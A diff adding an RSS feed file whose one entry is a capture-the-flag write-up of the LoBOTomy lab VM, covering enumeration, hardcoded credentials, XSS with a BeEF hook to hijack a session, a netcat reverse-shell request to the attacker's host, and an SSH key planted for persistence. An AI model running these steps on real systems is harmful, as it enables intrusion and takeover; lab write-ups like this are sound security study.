@@ -1,0 +1,409 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Bot challenges on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/bot-challenges/</link>
+    <description>Recent content in Bot challenges on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 16 Jun 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/bot-challenges/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>LoBOTomy</title>
+      <link>http://rastamouse.me/writeups/2014/lobotomy/</link>
+      <pubDate>Mon, 16 Jun 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/lobotomy/</guid>
+      <description>
+
+&lt;p&gt;The goal of the VM is to obtain a root shell.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:53aa007fdface966a5cc43503783e0d4&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.127.128
+ 
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 c0:41:42:1f:08:d9:26:6b:0e:32:dd:eb:a6:b8:94:ef (DSA)
+|   2048 74:4d:1a:68:c8:db:9c:e6:46:d3:13:d8:e0:5e:ca:74 (RSA)
+|_  256 9a:1c:a5:6b:a3:48:3c:8e:16:cd:c9:60:68:ef:d5:55 (ECDSA)
+80/tcp  open  http    Apache httpd 2.4.9 ((Debian))
+|_http-title: Site doesn&#39;t have a title (text/html).
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|_  100000  2,3,4        111/udp  rpcbind
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I punched the IP into a web browser, and was greeted by the following:&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/lobotomy/web.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;The blog post is a pretty good read - it&amp;rsquo;s Brian&amp;rsquo;s original write up of the bot this challenge is based on.  The text here tells us two things really.  The first is that a copy of the bot&amp;rsquo;s source code is present on this web service somewhere; the second is that there&amp;rsquo;s a simulated client which regularily access the bot panel.&lt;/p&gt;
+
+&lt;h2 id=&#34;wfuzz:53aa007fdface966a5cc43503783e0d4&#34;&gt;WFuzz&lt;/h2&gt;
+
+&lt;p&gt;I next set about the task of finding the bot source code.  I suspected that it would be in some compressed format, so I used &lt;code&gt;WFuzz&lt;/code&gt; with the various Kali wordlists and prepended with various extensions (.tar.gz, .tar, .bz2, .zip etc)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:/usr/share/wfuzz# wfuzz -c -z file,wordlist/general/common.txt -z file,wordlist/compression_extensions.txt --hc 404 http://192.168.127.128/FUZZ.FUZ2Z
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I spent ages on this and still wasn&amp;rsquo;t finding any files.  Eventually, it occured to me that the wordlists were all lowercase but WFuzz doesn&amp;rsquo;t have any built-in manging rules.  I sort of took a punt and converted the first letter of each line of some of the wordlists, then ran them again with my file extensions.  I used sed for the conversion.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sed  &#39;s/^\(.\)/\U\1/&#39; yourfile &amp;gt; convertedfile
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Eventually I got a hit on &lt;code&gt;Panel.zip&lt;/code&gt;.  Downloading and extracting the files give you a proper idea of what to find on the web server itself.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/LoBOTomy/Panel# ls -l
+total 24
+drwxr-xr-x 5 root root 4096 Apr  5 02:02 adm
+drwxr-xr-x 2 root root 4096 Apr  5 02:03 inc
+-rw-r--r-- 1 root root 1343 Nov  8  2013 index.php
+-rw-r--r-- 1 root root 1810 Feb  6  2010 logo.gif
+drwxr-xr-x 2 root root 4096 Dec  3  2013 pwd
+drwxr-xr-x 2 root root 4096 Apr  5 02:44 sql (dont upload)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried navigating to some of these directories, but kept receiving &lt;code&gt;404&#39;s&lt;/code&gt;.  A little more fuzzing showed that they simply within another directory, &lt;code&gt;&#39;m&#39;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The main bot page was found at &lt;code&gt;http://192.168.127.128/m/adm/auth.php&lt;/code&gt;.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/lobotomy/madness.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;The default username and password is hardcoded in plaintext within &lt;code&gt;inc/config.php&lt;/code&gt;.  I found it using &lt;code&gt;grep&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/LoBOTomy/Panel# grep -R -i &amp;quot;pass\|password&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can login and take a look around, though there isn&amp;rsquo;t much to see.&lt;/p&gt;
+
+&lt;h2 id=&#34;xss:53aa007fdface966a5cc43503783e0d4&#34;&gt;XSS&lt;/h2&gt;
+
+&lt;p&gt;You could probably discover this yourself by reviewing the source code, but I came across this vulnerability whilst I was reading up on Madness.  There is also a SQLi vulnerability, but given the clue regarding an automated client, I stuck with the XSS.&lt;/p&gt;
+
+&lt;p&gt;Funnily enough, the two Madness exploits on &lt;code&gt;exploit-db&lt;/code&gt; were written by Brian Wallace xD.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/lobotomy/exploit-db.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;For proper XSS-pwnage, there&amp;rsquo;s only one way to go: BeEF!&lt;/p&gt;
+
+&lt;p&gt;I modified the python exploit to make the XSS point to my beef hook.  Launch the exploit, sit back and wait&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/lobotomy/exploit.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/lobotomy/hook.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+&lt;/p&gt;
+
+&lt;p&gt;I took the &lt;code&gt;PHPSESSID&lt;/code&gt; of the hooked browser and used it to access Madness again.  This time you can see the bot loaded into the panel.  I tried to make it do &amp;lsquo;stuff&amp;rsquo; but without much success.&lt;/p&gt;
+
+&lt;p&gt;Eventually I went back to BeEF and carried out a port scan, through the BeEF HTTP proxy against the loopback address of the box.&lt;/p&gt;
+
+&lt;p&gt;
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/lobotomy/portscan.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/lobotomy/ports.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+&lt;/p&gt;
+
+&lt;p&gt;So we can see ports 22 and 80 (which are kind of expected as they&amp;rsquo;re usually bound to 0.0.0.0), and 3306 which makes sense to bind locally.  However, there is also 8080 which is an alternate to 80 and is unusual to see bound only to the localhost.&lt;/p&gt;
+
+&lt;h2 id=&#34;curl:53aa007fdface966a5cc43503783e0d4&#34;&gt;cURL&lt;/h2&gt;
+
+&lt;p&gt;Running netstat on my Kali box, shows that the BeEF proxy is bound to port 6789.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# netstat -antp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:6789          0.0.0.0:*               LISTEN      3234/ruby
+tcp        0      0 0.0.0.0:2000            0.0.0.0:*               LISTEN      3234/ruby
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      2566/sshd
+tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      3234/ruby
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used an environmental export, to set this as an HTTP proxy and was able to use cURL to communicate directly with the service.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# export http_proxy=&#39;http://127.0.0.1:6789&#39;
+ 
+root@kali:~# curl -v http://127.0.0.1:8080/
+* About to connect() to proxy 127.0.0.1 port 6789 (#0)
+*   Trying 127.0.0.1...
+* connected
+* Connected to 127.0.0.1 (127.0.0.1) port 6789 (#0)
+&amp;gt; GET http://127.0.0.1:8080/ HTTP/1.1
+&amp;gt; User-Agent: curl/7.26.0
+&amp;gt; Host: 127.0.0.1:8080
+&amp;gt; Accept: */*
+&amp;gt; Proxy-Connection: Keep-Alive
+&amp;gt;
+* additional stuff not fine transfer.c:1037: 0 0
+[...snip...]
+* additional stuff not fine transfer.c:1037: 0 0
+* HTTP 1.1 or later with persistent connection, pipelining supported
+&amp;lt; HTTP/1.1 200
+&amp;lt; Content-Type: text/html; charset=UTF-8
+* no chunk, no close, no size. Assume close to signal end
+&amp;lt;
+ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.
+* nread &amp;lt;= 0, server closed connection, bailing
+* Closing connection #0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I wanted to fuzz this port but WFuzz didn&amp;rsquo;t seem to be returning responses properly, so instead I tried &lt;code&gt;dirb&lt;/code&gt;.  Dirb simply prints out which requests it receives a response from.  The process was terribly slow, as everything was getting routed through the BeEF proxy.&lt;/p&gt;
+
+&lt;p&gt;The first hint of a hit was:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;+ http://127.0.0.1:8080/arch (CODE:200|SIZE:7)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I went to the BeEF Rider history to look up what the actual response was, which turned out to be &amp;lsquo;i686&amp;rsquo;.  Arch is a shell command which prints the machine architecture, so perhaps this service is just some sort of shell bound to 8080.&lt;/p&gt;
+
+&lt;p&gt;I used the Rider to send my own test command:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;GET /whoami HTTP/1.1
+Host: 127.0.0.1:8080
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To which the response was &lt;code&gt;root&lt;/code&gt;.  I did a little more poking and determined that &lt;code&gt;netcat&lt;/code&gt; was installed, and was able to leverage that to get a more useful shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;GET /nc%20192.168.127.127%204444%20-e%20%27%2Fbin%2Fsh%27 HTTP/1.1
+Host: 127.0.0.1:8080
+
+root@kali:~# nc -lnvp 4444
+nc: listening on :: 4444 ...
+nc: listening on 0.0.0.0 4444 ...
+ 
+nc: connect to 192.168.127.127 4444 from 192.168.127.128 54444
+ 
+id; whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With a root shell, this is pretty much the end of the challenge.  The final step I took was to add my public SSH key into root&amp;rsquo;s &lt;code&gt;authorized_keys&lt;/code&gt; file for easy access.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
